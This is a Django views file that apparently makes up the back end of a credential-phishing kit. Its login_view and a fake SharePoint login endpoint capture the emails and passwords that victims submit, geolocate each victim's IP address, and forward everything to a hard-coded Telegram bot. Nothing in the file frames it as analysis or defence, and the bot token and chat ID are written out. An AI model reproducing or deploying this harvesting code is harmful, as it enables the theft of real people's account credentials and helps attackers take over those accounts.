from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
import requests
from .models import Mail
from django.http import JsonResponse
import json


# Create your views here.


def send_to_telegram(message):
    token = "7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ"
    chat_id = "7548826388"
    # chat_id = "1374918767"
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
    res = requests.get(url).json()
    return res


def get_country_from_ip(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        country = data.get("country")  # Country name, e.g., "United States"
        city = data.get("city")
        return country, city
    return None, None


@csrf_exempt
def login_view(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("pass")
        ip_address = request.META.get("REMOTE_ADDR")
        country, city = get_country_from_ip(ip_address)
        # if email and password:
        #     # Save data to the database
        #     Mail.objects.create(
        #         email=email,
        #         password=password
        #     )
        subject = "New details submitted"
        mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\nusername: {email}\npassword: {password}"
        send_to_telegram(mail_message)
        print(mail_message)
    return render(request, "index.html")


def success_view(request):

    return render(request, "back.html")


@csrf_exempt  # for AJAX POST from external domain
def sharepoint_login(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            email = data.get("email")
            password = data.get("password")
            ip_address = request.META.get("REMOTE_ADDR")
            country, city = get_country_from_ip(ip_address)
            subject = "New sharepoint details submitted"
            mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\nemail: {email}\npassword: {password}"
            send_to_telegram(mail_message)
            print(mail_message)

            # Example check (replace with your real authentication logic)
            if email == "test@example.com" and password == "12345":
                return JsonResponse({"success": True})
            else:
                return JsonResponse(
                    {"success": False, "message": "Invalid credentials."}
                )
        except Exception as e:
            return JsonResponse({"success": False, "message": str(e)})
    return JsonResponse({"success": False, "message": "Invalid request method"})
